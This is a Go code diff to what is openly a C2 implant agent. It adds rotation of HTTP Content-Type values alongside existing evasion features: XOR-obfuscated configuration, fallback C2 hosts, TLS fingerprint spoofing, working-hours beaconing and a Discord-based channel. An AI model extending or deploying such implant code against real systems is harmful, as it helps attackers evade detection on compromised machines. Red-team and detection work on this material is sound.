@@ -51,6 +51,7 @@ var (
 	tlsVerify         string = "none" // TLS verification: none, system-ca, pinned:<fingerprint>
 	tlsFingerprint    string = ""     // TLS ClientHello fingerprint: chrome, firefox, safari, edge, random, go (default)
 	fallbackHosts     string = ""     // Comma-separated fallback C2 URLs for automatic failover
+	contentTypes      string = ""     // Comma-separated Content-Type values for request rotation
 	workingHoursStart string = ""     // Working hours start (HH:MM, 24hr local time)
 	workingHoursEnd   string = ""     // Working hours end (HH:MM, 24hr local time)
 	workingDays       string = ""     // Active days (1-7, Mon=1, Sun=7, comma-separated)
@@ -100,6 +101,7 @@ func runAgent() {
 			proxyURL = xorDecodeString(proxyURL, keyBytes)
 			customHeaders = xorDecodeString(customHeaders, keyBytes)
 			fallbackHosts = xorDecodeString(fallbackHosts, keyBytes)
+			contentTypes = xorDecodeString(contentTypes, keyBytes)
 			discordBotToken = xorDecodeString(discordBotToken, keyBytes)
 			discordChannelID = xorDecodeString(discordChannelID, keyBytes)
 			// Zero the XOR key — no longer needed after deobfuscation
@@ -327,6 +329,17 @@ func runAgent() {
 			}
 		}
 
+		// Parse content types (comma-separated list for request rotation)
+		var ctList []string
+		if contentTypes != "" {
+			for _, ct := range strings.Split(contentTypes, ",") {
+				ct = strings.TrimSpace(ct)
+				if ct != "" {
+					ctList = append(ctList, ct)
+				}
+			}
+		}
+
 		httpProfile := http.NewHTTPProfile(
 			callbackURL,
 			userAgent,
@@ -342,6 +355,7 @@ func runAgent() {
 			tlsVerify,
 			tlsFingerprint,
 			fallbackURLs,
+			ctList,
 		)
 		// Decode and apply custom HTTP headers from C2 profile
 		if customHeaders != "" {
@@ -882,6 +896,7 @@ func clearGlobals() {
 	tlsVerify = ""
 	tlsFingerprint = ""
 	fallbackHosts = ""
+	contentTypes = ""
 	tcpBindAddress = ""
 	discordBotToken = ""
 	discordChannelID = ""
